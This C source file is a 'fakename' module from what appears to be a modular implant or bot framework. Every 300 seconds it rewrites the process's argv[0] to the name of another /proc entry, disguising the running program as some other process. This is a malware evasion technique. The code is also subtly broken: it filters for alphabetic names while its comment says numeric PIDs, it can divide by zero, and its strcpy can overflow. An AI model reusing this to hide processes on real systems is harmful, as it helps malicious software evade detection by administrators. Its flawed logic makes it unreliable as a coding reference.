/*
fakename - scan /proc/ * /cmdline and become a random process
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <ctype.h>
#include <stdint.h>
#include "list.h"
#include "structs.h"
#include "utils.h"
#include "fakename.h"

// check function (isalpha(), etc)
typedef int (*check_func)(int);

char **Gargv = NULL;
int Gargc = 0;

ModuleFuncs fakename_funcs = { NULL, NULL, NULL, NULL,
    &fakename_execute, NULL, NULL};

// execute every 300 seconds
Modules ModuleFakeName = { 
    NULL, //next
     NULL,  // buf
    0,  // fd
    0,  // start ts
    1,  // compiled in
    12, // id 
    0,  // type 
    0, // listen port
    0, // start state.. 
    0, // out fd
    0, // timer start
    300, // timer interval
    &fakename_funcs, // funcs 
    NULL,   // connections
    NULL, // node list
    NULL, // custom functions
    NULL, // magic
    0
};


int fakename_init(Modules **module_list, char **_argv, int _argc) {
    int i = 0;
    
    Module_Add(module_list, &ModuleFakeName);
    
    Gargv = _argv;
    Gargc = _argc;
    
    // clear all of the command line information (so we can replace)
    for (i = 0; i < _argc; i++)
        memset(_argv[i], 0, strlen(_argv[i]));
}


// verify an entire string matches a GNU check function
// ie isalpha
int strcheck(char *str, check_func func) {
    int i = 0;
    
    while (str[i] != 0) {
        if (!func(str[i])) {
            return 0;
        }
        i++;
    }
    
    return 1;
}

int fakename_execute(Modules *mptr, Connection *cptr, char *buf, int size) {
    int i = 0;
    char *cmdline = NULL;
    struct dirent *de = NULL;
    char plist[16][16];
    int cur = 0;
    DIR *dp = opendir("/proc");
    
    if (dp == NULL) return -1;
    
    memset((char *)&plist, 0, 16*16);
    
    while (de = readdir(dp)) {
        // make sure its only a number by piggybacking isalpha using our check string
        if (!strcheck((char *)&de->d_name, &isalpha))
            continue;
            
        strncpy((char *)&plist[cur++ % 16], de->d_name, 16);
        
        i++;
    }
    
    closedir(dp);
    
    // choose a random.. allow less than 16 using counter in case its less..
    i = rand() % cur % 16;
    
    //printf("plist: %s\n", (char *)plist[i]);
    
    // copy this command as the command line..
    strcpy((char *)Gargv[0], plist[i]);
    
    return 0;
}